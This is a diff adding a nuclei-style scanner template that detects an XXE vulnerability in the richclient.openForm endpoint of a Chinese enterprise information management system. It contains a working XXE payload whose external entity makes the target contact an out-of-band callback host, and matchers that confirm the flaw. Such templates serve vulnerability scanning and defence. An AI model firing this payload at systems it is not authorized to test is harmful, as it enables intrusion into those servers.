@@ -1,0 +1,39 @@
+id: poc-yaml-skzy-eims-richclient-openform-anyfile-read
+info:
+  name: 时空智友企业信息管理系统 richclient.openForm XXE漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: DNSLOG,xxe
+  description: |
+    时空智友企业信息管理系统 richclient.openForm接口存在XXE漏洞。
+
+variables:
+  reverse: '{{interactsh-url}}'
+
+http:
+  - method: POST
+    path:
+      - "/formservice?service=richclient.openForm"
+    headers:
+      Content-Type: application/xml
+    body: |-
+      <?xml version="1.0" encoding="UTF-8" ?>
+      <!DOCTYPE root [ <!ENTITY xxe SYSTEM "http://{{reverse}}">]>
+      <xxx>&xxe;</xxx>
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "<errmsg>"
+          - "richclient.openForm"
+          - "提交数据格式有误"
+        part: body
+      - type: word
+        words:
+          - "text/xml"
+        part: header
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
